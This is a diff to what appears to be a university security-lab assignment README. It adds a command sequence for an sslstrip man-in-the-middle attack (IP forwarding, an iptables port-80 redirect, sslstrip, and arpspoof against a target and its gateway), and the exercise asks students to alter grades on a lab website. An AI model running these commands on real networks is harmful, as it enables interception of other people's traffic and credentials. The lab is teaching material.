@@ -282,7 +282,15 @@ In this assignment you will be using the following tools:
 				sudo pip install cryptography
 				sudo pip install pyopenssl
 				sudo pip install service_identity
-			* Running sslstrip nicely explained: http://jkook.blogspot.de/2009/09/sslstrip-step-by-step-on-ubuntu.html	
+
+		* Running sslstrip:
+			* ```
+				sudo sysctl -w net.ipv4.ip_forward=1
+				sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <listenPort>
+				sudo sslstrip.py -l <listenPort>		
+				sudo arpspoof -i <interface> -t <targetIP> <gatewayIP>
+				
+		* Running sslstrip nicely explained: http://jkook.blogspot.de/2009/09/sslstrip-step-by-step-on-ubuntu.html	
 
 	* e) Finally, log in to the website, find your grades, and edit them to your desired result. After that, write your student numbers and the result you set to **exercise1e**.
 	
